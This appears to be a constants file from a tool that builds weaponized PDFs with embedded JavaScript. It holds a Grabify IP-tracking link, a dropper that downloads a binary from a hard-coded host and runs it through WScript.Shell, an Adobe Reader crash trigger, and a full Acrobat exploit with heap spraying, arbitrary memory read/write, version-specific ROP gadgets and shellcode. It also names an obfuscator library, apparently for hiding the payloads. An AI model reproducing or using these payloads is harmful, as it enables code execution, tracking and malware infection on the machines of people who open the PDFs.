# URL:
URL_GRABIFY_LINK: str = "https://grabify.link/D5TUJA"
URL_DOWNLOAD_FILE: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"

# Payloads constants

JS_CODE = """
var today = new Date();
var msg = 'PDF opened on: ' + today.toLocaleDateString() + ' ' + today.toLocaleTimeString();
app.alert(msg);
"""

JS_CODE_TEST = """
  app.alert("Hello PDF!");
"""

PAYLOAD_COLLECT_INFORMATION_USING_GRABIFY = f"""
    app.launchURL("{URL_GRABIFY_LINK}");
"""

PAYLOAD_DOWNLOAD_FILE = f"""
    app.launchURL("{URL_DOWNLOAD_FILE}");
"""

PAYLOAD_DROPPER = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://192.168.254.130/code.bin', true);
    xhr.responseType = 'arraybuffer';
    xhr.onload = function() {
        var code = new Uint8Array(xhr.response);
        var shellcode = [];
        for (var i = 0; i < code.length; i++) {
            shellcode.push(String.fromCharCode(code[i]));
        }
        var exec = new ActiveXObject('WScript.Shell');
        exec.run('%comspec% /c', 'echo ' + shellcode.join('') + ' > C:\\ProgramFiles\\maliciousfile.exe', 0);
        exec.run('%comspec% /c', 'start C:\\ProgramFiles\\maliciousfile.exe', 0);
    };
    xhr.send();
"""

PAYLOAD_MOCK_ADOBE_CRASH =  """
    console.show();

    var chunks = [];
    var bufs = [];
    var arrs = [];

    function PropAccClosure(obj, prop) {
        obj = obj;
        prop = prop;
        return function () {
            return obj[prop];
        };
    }

    console.println("[*] triggering bug...");

    var f0 = this.getField("testfield");
    f0.richText = true;
    f0.setAction("Calculate", "callback0()");

    // override popups
    try {
        Object.defineProperty(this["Collab"], "defaultStore", { enumerable: false });
    } catch (e) {}

    var mythis = {};
    for (var k in this) {
        if (k == "URL" || k == "bookmarkRoot" || k == "ptrs" || k == "arrs" || k == "bufs") continue;
        mythis[k] = 0;
        mythis.__defineGetter__(k, PropAccClosure(this, k));
    }

    event.target = mythis;
    f0.__defineGetter__("doc", function () {
        return mythis;
    });

    // trigger bug
    try {
        this.resetForm();
    } catch (e) {}
    try {
        this.resetForm();
    } catch (e) {}

    function callback0() {
        event.__defineGetter__("target", func_0);
        event.richValue = mythis;
    }

    function func_0() {
        try {
            Object.defineProperty(f0, "textFont", { value: this });
        } catch (e) {}
    }
    
    
"""

PAYLOAD_MOCK_SHELLCODE_ADOBE_EXPLOIT = """
    console.show();

    const VersionData = {
        22.00120085: {
            AcroFormOffset: 0x00293fe0,
            VirtualProtect: 0x007da108,
            ROP: [0x6faa60, 0x256984, 0x1e646]
        },
        22.00120117: {
            AcroFormOffset: 0x00293fe0,
            VirtualProtect: 0x007d9108,
            ROP: [0x6f9900, 0x256974, 0x5030f9]
        },
        22.00120142: {
            AcroFormOffset: 0x00294060,
            VirtualProtect: 0x007d9108,
            ROP: [0x6f9a00, 0x256a14, 0x49caf7]
        },
        22.00320258: {
            AcroFormOffset: 0x002943c0,
            VirtualProtect: 0x007da108,
            ROP: [0x6fa7a0, 0x32c71 /*xchg eax, esp ; RET ;*/, 0x1a4592 /*pop esp ; ret; */]
        }
    };

    var curAppVersion = app.viewerVersion;

    if (!curAppVersion in VersionData) {
        app.alert("version is not supported");
    }

    const ALLOC_SIZE = 0x10000 - 24;
    const ARR_BUF_BASE = 0x20000048;
    const ARR_BUF_MALLOC_BASE = 0x20000040;

    const arrBufPtr = ARR_BUF_BASE + 0x10;

    const FAKE_STR_START = 0x40;
    const FAKE_STR = arrBufPtr + 0x100;
    const FAKE_DV_START = 0x60;
    const FAKE_DV = arrBufPtr + 0x180;

    var chunks = [];
    var bufs = [];
    var arrs = [];
    var redv = new DataView(new ArrayBuffer(4));

    // target objects for corruption
    var targetStr = "Hello";
    var targetDV = new DataView(new ArrayBuffer(0x64));
    targetDV.setUint32(0, 0x55555555, true);

    function PropAccClosure(obj, prop) {
        obj = obj;
        prop = prop;
        return function () {
            return obj[prop];
        };
    }

    function re(n) {
        redv.setUint32(0, n, false);
        return redv.getUint32(0, n, true);
    }

    function triggerGC() {
        new ArrayBuffer(3 * 1024 * 1024 * 100);
    }

    function groomLFH(size, count) {
        var code =
            "%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484";
        var string = unescape(code);

        for (var i = 0; i < count; i++) {
            chunks.push(string.substr(0, (size - 2) / 2).toUpperCase());
        }

        for (var i = 0; i < chunks.length; i += 2) {
            chunks[i] = null;
            delete chunks[i];
        }
    }

    function sprayArrBuffers() {
        for (var i = 0; i < 0x1500; i++) {
            bufs[i] = new ArrayBuffer(ALLOC_SIZE);
            const uintArr = new Uint32Array(bufs[i]);
            for (var k = 0; k < 16; k++) {
                uintArr[k] = 0x33333333;
            }
            uintArr[0] = arrBufPtr + 8; //first deref a = *ecx
            uintArr[1] = 0x41424344; //map size
            uintArr[2] = 0x41424344;
            uintArr[3] = ARR_BUF_BASE - 4;

            // fake string for arbitrary read
            uintArr[FAKE_STR_START] = 0x102; //type
            uintArr[FAKE_STR_START + 1] = arrBufPtr + 0x40; // buffer
            uintArr[FAKE_STR_START + 2] = 0x4;
            uintArr[FAKE_STR_START + 3] = 0x4;

            // fake dataview for arbitrary write
            uintArr[FAKE_DV_START] = 0x77777777;
            delete uintArr;
            uintArr = null;
        }

        for (var i = 0; i < 0x10; i++) {
            arrs[i] = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23);
            arrs[i][0] = 0x47484950;
            arrs[i][1] = targetStr;
            arrs[i][2] = targetDV;
            for (var k = 3; k < 5000; k++) {
                arrs[i][k] = 0x50515051;
            }
        }
    }

    console.println("[*] spraying array buffer...");

    sprayArrBuffers();

    console.println("[*] pre-populating LFH...");

    groomLFH(68, 5000);

    console.println("[*] triggering bug...");

    var f0 = this.getField("testfield");
    f0.richText = true;
    f0.setAction("Calculate", "callback0()");

    // override popups
    try {
        Object.defineProperty(this["Collab"], "defaultStore", { enumerable: false });
    } catch (e) {}

    var mythis = {};
    for (var k in this) {
        if (k == "URL" || k == "bookmarkRoot" || k == "ptrs" || k == "arrs" || k == "bufs") continue;
        mythis[k] = 0;
        mythis.__defineGetter__(k, PropAccClosure(this, k));
    }

    event.target = mythis;
    f0.__defineGetter__("doc", function () {
        return mythis;
    });

    // trigger bug
    try {
        this.resetForm();
    } catch (e) {}
    try {
        this.resetForm();
    } catch (e) {}

    function callback0() {
        event.__defineGetter__("target", func_0);
        event.richValue = mythis;
    }

    function func_0() {
        try {
            Object.defineProperty(f0, "textFont", { value: this });
        } catch (e) {}
    }

    console.println("[*] checking for corrupted array buffer...");

    var arrStart = 0;
    var corruptedTypedArr = null;

    var originalTargetStrAddr = 0,
        originalTargetDVAddr = 0;

    for (var i = 0; i < bufs.length; i++) {
        if (bufs[i].byteLength != ALLOC_SIZE) {
            console.println(
                "[+] corrupted array buffer found at " +
                    i +
                    " : length: " +
                    bufs[i].byteLength +
                    " : buf length: " +
                    bufs.length
            );
            const uintArr = new Uint32Array(bufs[i]);

            console.println("[*] checking leaked global array...");

            for (var x = ((bufs.length - i) * 0xfff8) / 4; x < uintArr.length; x++) {
                if (uintArr[x] == 0x47484950) {
                    arrStart = x - 4;
                    console.println("[*] leaked global array found at index:" + arrStart);
                    break;
                }
            }

            // store for recovery
            originalTargetStrAddr = uintArr[arrStart + 6];
            originalTargetDVAddr = uintArr[arrStart + 8];

            // corrupt for further primitives
            uintArr[arrStart + 4] = 0x47484951;
            uintArr[arrStart + 6] = FAKE_STR;
            uintArr[arrStart + 8] = FAKE_DV;

            corruptedTypedArr = uintArr;

            break;
        }
    }

    console.println("[*] obtaining modified array...");

    var modifiedArr = null;

    for (var i = 0; i < arrs.length; i++) {
        if (arrs[i][0] == 0x47484951) {
            modifiedArr = arrs[i];
            break;
        }
    }

    if (!modifiedArr) {
        app.alert("[?] obtaining modified array failed...");
    }

    console.println("[*] preparing exploitation primitives...");

    function addrOf(obj) {
        modifiedArr[0] = obj;
        addr = corruptedTypedArr[arrStart + 4];
        return addr;
    }

    function s2h(s) {
        var n1 = s.charCodeAt(0);
        var n2 = s.charCodeAt(1);
        return ((n2 << 16) | n1) >>> 0;
    }

    function poi(addr) {
        // leak values at addr by setting it to string ptr
        corruptedTypedArr[FAKE_STR_START + 1] = addr;
        val = s2h(modifiedArr[1]);
        return val;
    }

    // get original target str backing store so that we can restore it
    var originalStrBstore = corruptedTypedArr[FAKE_STR_START + 1];

    console.println("[+] original target string backing store: " + originalStrBstore.toString(16));

    // clone target dataview pointer for faking it.
    var targetDVPtr = addrOf(targetDV);
    console.println("[+] target dataview address: " + targetDVPtr.toString(16));

    for (var k = 0; k < 32; k++) {
        corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * 4);
    }

    function AAR(addr) {
        corruptedTypedArr[FAKE_DV_START + 20] = addr;
        return modifiedArr[2].getUint32(0, true);
    }

    function AAW(addr, value) {
        corruptedTypedArr[FAKE_DV_START + 20] = addr;
        modifiedArr[2].setUint32(0, value, true);
    }

    var originalDVBackingStore = corruptedTypedArr[FAKE_DV_START + 20];
    console.println(
        "[+] original dataview backing storage ptr: " + originalDVBackingStore.toString(16)
    );

    var AcroFormApiBase =
        AAR(AAR(addrOf(f0) + 0x10) + 0x34) - VersionData[curAppVersion]["AcroFormOffset"];
    console.println("[+] AcroForm base leaked: " + AcroFormApiBase.toString(16));

    var fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + 0x10) + 0x10) + 0xc) + 4);
    var fieldVtbl = AAR(fieldVtblAddr);

    console.println(
        "[+] field vTable Addr: " +
            fieldVtblAddr.toString(16) +
            " | fieldVtable: " +
            fieldVtbl.toString(16)
    );

    console.println("[*] clone field vtable for overwriting defaultValue pointer");

    for (var i = 0; i < 32; i++) AAW(arrBufPtr + 0x100 + i * 4, AAR(fieldVtbl + i * 4));

    var originalDefaulValFunc = AAR(arrBufPtr + 0x100 + 0x48);

    console.println("[+] original defaultValue impl function: " + originalDefaulValFunc.toString(16));

    console.println("[*] setting up ROP and shellcode...");

    ROP = VersionData[curAppVersion]["ROP"];
    AAW(arrBufPtr + 0x100 + 0x48, AcroFormApiBase + ROP[0]); // ROP_s = AcroForm!sub_20EFAA60 ;
    AAW(arrBufPtr + 0x100 + 0x30, AcroFormApiBase + ROP[1]); // xchg eax, esp ; ret ;
    AAW(arrBufPtr + 0x100, AcroFormApiBase + ROP[2]); // pop esp ; ret ;
    AAW(arrBufPtr + 0x100 + 4, arrBufPtr + 0x300); // pivot to our _stack
    AAW(fieldVtblAddr, arrBufPtr + 0x100); // overwrite field vtable to our ROP start

    console.println("[*] storing recovery context!");
    AAW(arrBufPtr + 0x300 + 0x60, fieldVtblAddr); // original vtable ptr (goes back in ecx)
    AAW(arrBufPtr + 0x300 + 0x64, fieldVtbl); // vtable funcs ptr
    AAW(arrBufPtr + 0x300 + 0x68, originalDefaulValFunc); // original defaultVal impl to jump to
    AAW(arrBufPtr + 0x300 + 0x6c, AAR(ARR_BUF_BASE + 8)); // corrupted arrbuf typed array ptr
    AAW(arrBufPtr + 0x300 + 0x70, AAR(ARR_BUF_MALLOC_BASE)); // malloc header 0
    AAW(arrBufPtr + 0x300 + 0x74, AAR(ARR_BUF_MALLOC_BASE + 4)); // malloc header 1

    var rop = [
        AAR(AcroFormApiBase + VersionData[curAppVersion]["VirtualProtect"]), // VirtualProtect
        arrBufPtr + 0x400, // return address
        arrBufPtr + 0x400, // buffer
        0x1000, // sz
        0x40, // new protect
        arrBufPtr + 0x540 // old protect
    ];

    for (var i = 0; i < rop.length; i++) AAW(arrBufPtr + 0x300 + 4 * i, rop[i]);

    var shellcode = [
        // recovery prefix       (store reg context)
        // 0x909090CC,
        0x89e083e8, 0x18535256, 0x57505590,

        // shellcode
        835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
        1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
        469892611, 1018101719, 2425393296,

        // recovery suffix
        // 0x909090CC,
        /*restore regs*/ 0x58585d58, /*restore vtable*/ 0x8b48608b, 0x50648911, /*pop regs*/ 0x5f5e5a5b,
        /*restore ebp,esp: 0x89ea83ea, 0x3089d490, */ 0x89ec83ec, 0x30909090, /* esi = fn*/ 0x8b706890,
        /*arrbuf restore*/ 0x53bb4000, 0x00208b50, 0x6cc7430c, 0xe8ff0000, 0xc74220e8, 0xff000090,
        0x8953108b, 0x50708913, 0x8b507489, 0x530431d2, 0x5b909090, /*jmp esi*/ 0xffe69090
        /*jmp defaultVal 0xff606890*/
    ];

    for (var i = 0; i < shellcode.length; i++) AAW(arrBufPtr + 0x400 + i * 4, re(shellcode[i]));

    // restore ds and context for recovery
    console.println(
        "[*] restoring target str addr: " +
            originalTargetStrAddr.toString(16) +
            " , targetDV addr: " +
            originalTargetDVAddr.toString(16)
    );

    corruptedTypedArr[arrStart + 6] = originalTargetStrAddr;
    //corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;
    corruptedTypedArr[arrStart + 8] = originalTargetDVAddr;

    console.println("[^] shellcode execute!");
    var x = f0.defaultValue;

    triggerGC();
"""

# Javascript library
# JavaScript obfuscator library
JS_OBFUSCATOR_LIBRARY = "javascript-obfuscator"

# Default PDF file paths
INPUT_PDF_DEFAULT: str = "old.pdf"
OUTPUT_PDF_DEFAULT: str = "new.pdf"

# Message constants
INPUT_PDF_OPTION_HELP: str = "Specify the file path of the input PDF."
OUTPUT_PDF_OPTION_HELP: str = "Specify the file path for the output PDF."
